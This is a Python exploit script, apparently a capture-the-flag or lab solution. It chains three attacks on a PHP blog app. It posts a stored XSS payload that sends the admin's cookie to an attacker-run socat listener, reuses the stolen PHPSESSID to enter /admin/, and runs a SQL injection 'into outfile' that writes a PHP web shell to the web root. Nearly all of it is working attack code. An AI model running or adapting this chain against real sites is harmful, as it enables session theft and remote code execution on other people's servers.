# 5/12/2022
#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import os
import time
import re

local_port = input("Enter Listen Address: ").strip()
remote_host = input("Enter Remote Address: ").strip()


def create_http_server():
    os.system('socat TCP-LISTEN:9100,reuseaddr,fork - > server.log & echo $! > process_id')



def wait_file():
    
    global session    
    if os.stat("server.log").st_size == 0:
        print("Waiting")
        time.sleep(10)
        print("wait")
        wait_file()
    else:
        with open("server.log", "r") as f:
            session = re.findall(r"PHPSESSID=\w+", f.read())
        os.system("kill $(cat process_id)")
    return session

# sess = requests.Session()

post_data = {
    "title" : "Test XSS",
    "author" : "XSS",
    "text" : f"""<script>document.write('<img src="http://{local_port}:9100/?' +document.cookie+' "/>');</script>""",
    "submit" : "Submit Query"
}

proxy = {
    "http" : "http://127.0.0.1:8080"
}

req = requests.post(f"http://{remote_host}/post.php?id=1",data=post_data, proxies=proxy)

create_http_server()
session_id = wait_file()[0]
print(session_id)

header_list = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Cookie" : session_id
}

req_xss = requests.get(f"http://{remote_host}/admin/", proxies=proxy, headers=header_list)
print(req_xss.text)


sql_header_list = {
    "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Content-Type": "multipart/form-data; boundary=---------------------------34433761631640999082259010474",
    "Cookie" : session_id,
}


sql_post_data = """Welcome\r\n-----------------------------34433761631640999082259010474\r\nContent-Disposition: form-data; name="text"\r\n\r\nhttp://{remote_host}/admin/edit.php?id=0 union select 1,2,"<?php system($_GET['c']); ?>",4 into outfile "/var/www/css/shell.php" #\r\n-----------------------------34433761631640999082259010474\r\nContent-Disposition: form-data; name="Update"\r\n\r\nUpdate\r\n-----------------------------34433761631640999082259010474--"""

upload_sql = requests.post(f"""http://{remote_host}/admin/edit.php?id=0 union select 1,2,"<?php system($_GET['c']); ?>",4 into outfile "/var/www/css/shell.php" #""",data=sql_post_data, headers=sql_header_list, proxies=proxy)

print(upload_sql.status_code)
print(upload_sql.text)